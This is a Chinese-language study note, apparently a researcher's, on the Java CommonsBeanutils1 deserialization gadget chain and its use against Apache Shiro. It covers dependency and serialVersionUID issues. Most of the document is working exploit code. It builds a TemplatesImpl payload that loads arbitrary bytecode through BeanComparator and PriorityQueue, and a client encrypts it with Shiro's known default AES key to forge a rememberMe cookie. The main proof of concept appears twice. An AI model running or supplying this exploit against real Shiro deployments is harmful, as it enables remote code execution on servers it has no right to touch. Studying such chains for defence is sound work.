### CommonsBeanutils1

#### 依赖CommonsCollections

* java.util.PriorityQueue#readObject调用org.apache.commons.beanutils.BeanComparator#compare
* org.apache.commons.beanutils.BeanComparator#compare通过 PropertyUtils.getProperty调用队列中两个比较对象的getter获取属性
* TemplatesImpl#getOutputProperties()可以执行任意代码

```java
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String classFileToBase64(String filepath) throws IOException {
        String classFilePath = filepath;
        String base64String;
        // 读取 class 文件的字节数组
        byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath));

        // 将字节数组转换为 Base64 编码字符串
        base64String= Base64.getEncoder().encodeToString(classBytes);

        return base64String;
    }
    public static void main(String[] args) throws Exception {
        String base64Code = classFileToBase64("C:\\Users\\tlj\\Desktop\\tmp\\java8u66\\CalcExample.class");

        byte[] code =
                Base64.getDecoder().decode(base64Code);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                code
        });
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
                comparator);
// stub data for replacement later
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

特别指出，在这条利用链中，没有用到CC库中的类，但是注意到BeanComparator的构造函数：

```java
public BeanComparator() {
    this( null );
}

public BeanComparator( String property ) {
    this( property, ComparableComparator.getInstance() );
}

public BeanComparator( String property, Comparator<?> comparator ) {
    setProperty( property );
    if (comparator != null) {
        this.comparator = comparator;
    } else {
        this.comparator = ComparableComparator.getInstance();
    }
}
```

在初始化时，没有指定一个Comparator，则BeanComparator会生成一个默认的Comparator——`org.apache.commons.collections.comparators.ComparableComparator`

所以上述反序列化链是依赖于commons-collections的，所以我们除了要添加CB的依赖，还需要添加CC的依赖。

```xml
<dependency>
            <groupId>commons-beanutils</groupId>
            <artifactId>commons-beanutils</artifactId>
            <version>1.9.2</version>
        </dependency>
 <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
```

#### 不依赖CommonsCollections

根据上面所说，只要给BeanComparator指定一个commons-beanutils中或者JRE中的存在的Comparator即可不依赖其他库，这里举两个例子，`java.util.Collections$ReverseComparator`或者`java.lang.String$CaseInsensitiveComparator`：

```java
// setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);
// setFieldValue(beanComparator, "comparator", Collections.reverseOrder());
```

#### 二次反序列化

### CB在Shiro环境下的利用

#### 依赖的问题

在shiro环境下，必有的依赖包是shiro-core、shiro-web、 commons-logging，也就是说不一定会存在commons-beanutils库和commonscollections库。

对于第一个问题，其实可以发现shiro是依赖于commons-beanutils的。

对于第二个问题，前文已经解答过。

#### serialVersionUID不一致的问题

将生成poc的commons-beanutils库版本修改为与shiro一致的1.8.3

#### 利用poc

```java
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String classFileToBase64(String filepath) throws IOException {
        String classFilePath = filepath;
        String base64String;
        // 读取 class 文件的字节数组
        byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath));

        // 将字节数组转换为 Base64 编码字符串
        base64String= Base64.getEncoder().encodeToString(classBytes);

        return base64String;
    }
    public static void main(String[] args) throws Exception {
        String base64Code = classFileToBase64("C:\\Users\\tlj\\Desktop\\tmp\\java8u66\\CalcExample.class");

        byte[] code =
                Base64.getDecoder().decode(base64Code);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                code
        });
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
                comparator);
// stub data for replacement later
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

```java
public class Client0 {
    public static void main(String[] args) throws Exception {
        Object objcc6 = new ShiroCB1().getObject();
        byte[] objcc6byte = SerializationUtils.serialize(objcc6);
        AesCipherService aes = new AesCipherService();
        byte[] key =
                java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(objcc6byte, key);
        System.out.printf(ciphertext.toString());
    }
}
```

